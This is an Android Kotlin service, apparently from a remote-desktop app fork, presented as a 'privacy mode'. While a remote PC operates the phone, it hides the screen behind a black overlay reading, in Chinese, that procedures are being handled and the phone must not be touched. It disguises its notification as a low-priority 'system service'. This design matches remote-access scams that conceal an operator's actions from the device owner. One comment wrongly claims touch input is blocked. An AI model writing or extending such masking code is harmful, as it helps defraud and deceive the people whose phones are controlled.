package com.carriez.flutter_hbb

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.widget.TextView
import androidx.core.app.NotificationCompat

/**
 * Privacy Mode Service - Black Screen Overlay
 * 
 * Creates a full-screen black overlay when PC is controlling Android device.
 * - Android screen shows black overlay with warning text
 * - Touch input is completely blocked
 * - PC side still sees real screen content and can control normally
 */
class PrivacyModeService : Service() {

    companion object {
        private const val TAG = "PrivacyModeService"
        private const val CHANNEL_ID = "privacy_mode_channel"
        private const val NOTIFICATION_ID = 2001
        
        @Volatile
        private var isActive = false
        
        /**
         * Start privacy mode (black screen)
         * Thread-safe with duplicate call protection
         */
        @Synchronized
        fun startPrivacyMode(context: Context) {
            if (isActive) {
                Log.d(TAG, "Privacy mode already active, ignoring duplicate call")
                return
            }
            Log.d(TAG, "Starting privacy mode")
            val intent = Intent(context, PrivacyModeService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        
        /**
         * Stop privacy mode (restore normal screen)
         * Thread-safe with duplicate call protection
         */
        @Synchronized
        fun stopPrivacyMode(context: Context) {
            if (!isActive) {
                Log.d(TAG, "Privacy mode not active, ignoring stop call")
                return
            }
            Log.d(TAG, "Stopping privacy mode")
            context.stopService(Intent(context, PrivacyModeService::class.java))
        }
    }
    
    private var privacyView: TextView? = null
    private var windowManager: WindowManager? = null
    private var notificationManager: NotificationManager? = null
    
    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "onCreate called")
        
        // Mark as active immediately
        isActive = true
        
        // Step 1: Check overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Log.e(TAG, "Overlay permission not granted")
                notifyPermissionError()
                stopSelf()
                return
            }
        }
        
        // Step 2: Create foreground notification (required for Android 8.0+)
        try {
            createForegroundNotification()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create foreground notification", e)
            stopSelf()
            return
        }
        
        // Step 3: Create full-screen black overlay
        try {
            createBlackOverlay()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to create black overlay", e)
            stopSelf()
            return
        }
        
        Log.d(TAG, "Privacy mode activated successfully")
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_NOT_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
    
    override fun onDestroy() {
        Log.d(TAG, "onDestroy called")
        
        // Remove black overlay
        privacyView?.let { view ->
            try {
                windowManager?.removeView(view)
                Log.d(TAG, "Privacy overlay removed")
            } catch (e: Exception) {
                Log.e(TAG, "Error removing privacy view", e)
            }
        }
        privacyView = null
        windowManager = null
        
        // Mark as inactive
        isActive = false
        
        super.onDestroy()
    }
    
    /**
     * Create foreground notification (required for Android 8.0+)
     */
    private fun createForegroundNotification() {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        
        // Create notification channel for Android 8.0+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "系统服务",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "后台服务运行中"
                setShowBadge(false)
            }
            notificationManager?.createNotificationChannel(channel)
        }
        
        // Build notification
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("系统服务")
            .setContentText("后台运行中")
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setAutoCancel(false)
            .build()
        
        // Start as foreground service
        startForeground(NOTIFICATION_ID, notification)
        Log.d(TAG, "Foreground notification created")
    }
    
    /**
     * Create full-screen black overlay with warning text
     */
    private fun createBlackOverlay() {
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        
        // Remove any existing view first (prevent memory leak)
        privacyView?.let { view ->
            try {
                windowManager?.removeView(view)
            } catch (e: Exception) {
                // Ignore if view was not attached
            }
        }
        
        // Create black overlay view with warning text
        privacyView = TextView(this).apply {
            setBackgroundColor(Color.BLACK)
            text = "正在为您办理手续\n请保持电量充足，勿操作手机"
            setTextColor(Color.WHITE)
            textSize = 28f
            gravity = Gravity.CENTER
        }
        
        // Window type based on Android version
        val windowType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }
        
        // Window parameters
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            windowType,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or      // Block all touch events
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or  // Don't steal focus
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,   // Keep screen on
            PixelFormat.OPAQUE
        )
        
        // Add overlay to window
        windowManager?.addView(privacyView, params)
        Log.d(TAG, "Black overlay created and displayed")
    }
    
    /**
     * Notify user about missing overlay permission
     */
    private fun notifyPermissionError() {
        Handler(Looper.getMainLooper()).post {
            MainActivity.flutterMethodChannel?.invokeMethod("msgbox", mapOf(
                "type" to "error",
                "title" to "Permission Required",
                "text" to "Please grant 'Display over other apps' permission to use privacy mode"
            ))
        }
    }
}
